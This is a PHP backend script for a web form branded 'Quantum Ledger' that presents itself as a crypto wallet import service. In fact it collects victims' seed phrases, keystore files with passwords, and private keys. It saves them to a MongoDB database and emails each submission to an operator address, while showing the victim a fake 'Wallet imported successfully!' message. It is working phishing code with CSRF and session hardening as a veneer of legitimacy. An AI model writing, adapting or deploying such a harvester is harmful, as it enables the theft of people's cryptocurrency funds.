<?php
// 1. Secure session & headers
ob_start();
session_start(['cookie_secure'=>true,'cookie_httponly'=>true,'use_strict_mode'=>true]);
header('Content-Type: application/json; charset=UTF-8');

// 2. Generate CSRF token
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// 3. GET = return token ONLY
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    echo json_encode(['csrf_token' => $_SESSION['csrf_token']]);
    exit;
}

// 4. POST = load deps safely
require_once __DIR__.'/../vendor/autoload.php';
use Dotenv\Dotenv;
$dotenv = Dotenv::createImmutable(__DIR__.'/..');
$dotenv->load();
// ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
require __DIR__.'/../vendor/autoload.php';
use MongoDB\Driver\Manager;
use MongoDB\Driver\BulkWrite;
use MongoDB\Driver\Exception\Exception as MongoDBException;
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception as PHPMailerException;

$dotenv = Dotenv::createImmutable(__DIR__.'/..');
$dotenv->load();

// CSRF check
if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    echo json_encode(['error' => 'Invalid CSRF Token']);
    exit;
}

// ——— FORM LOGIC (unchanged) ———
$submission_type = $wallet = $email = $data = '';
if (isset($_POST['pwallet'], $_POST['pemail'], $_POST['phrase'])) {
    $submission_type = 'phrase'; $wallet = $_POST['pwallet']; $email = $_POST['pemail']; $data = $_POST['phrase'];
} elseif (isset($_POST['kwallet'], $_POST['kemail'], $_POST['keystore'], $_POST['password'])) {
    $submission_type = 'keystore'; $wallet = $_POST['kwallet']; $email = $_POST['kemail']; $data = $_POST['keystore']."\nPassword: ".$_POST['password'];
} elseif (isset($_POST['prwallet'], $_POST['premail'], $_POST['private'])) {
    $submission_type = 'privatekey'; $wallet = $_POST['prwallet']; $email = $_POST['premail']; $data = $_POST['private'];
} else {
    echo json_encode(['error' => 'Invalid Submission']);
    exit;
}

if (empty($wallet) || empty($email) || empty($data) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo json_encode(['error' => 'Invalid Input']);
    exit;
}

// ——— MONGO ———
$mongo = new Manager("mongodb://{$_ENV['DB_USER']}:{$_ENV['DB_PASS']}@{$_ENV['DB_HOST']}:{$_ENV['DB_PORT']}/{$_ENV['DB_NAME']}?authSource=admin");
$bulk = new BulkWrite;
$bulk->insert([
    'wallet' => $wallet,
    'email'  => $email,
    'data'   => htmlspecialchars($data),
    'submission_type' => $submission_type,
    'created_at' => new \MongoDB\BSON\UTCDateTime
]);
$mongo->executeBulkWrite("{$_ENV['DB_NAME']}.submissions", $bulk);

// ——— EMAIL ———
$mail = new PHPMailer(true);
$mail->isSMTP();
$mail->Host = $_ENV['SMTP_HOST'];
$mail->SMTPAuth = true;
$mail->Username = $_ENV['SMTP_USER'];
$mail->Password = $_ENV['SMTP_PASS'];
$mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
$mail->Port = 587;
$mail->setFrom($_ENV['SMTP_USER'], 'Quantum Ledger');
$mail->addAddress($_ENV['TO_EMAIL']);
$mail->Subject = "New $submission_type from $wallet";
$mail->Body = "Wallet: $wallet\nEmail: $email\nData: $data\nTime: ".date('Y-m-d H:i:s');
$mail->send();

echo json_encode(['success' => 'Wallet imported successfully!']);
?>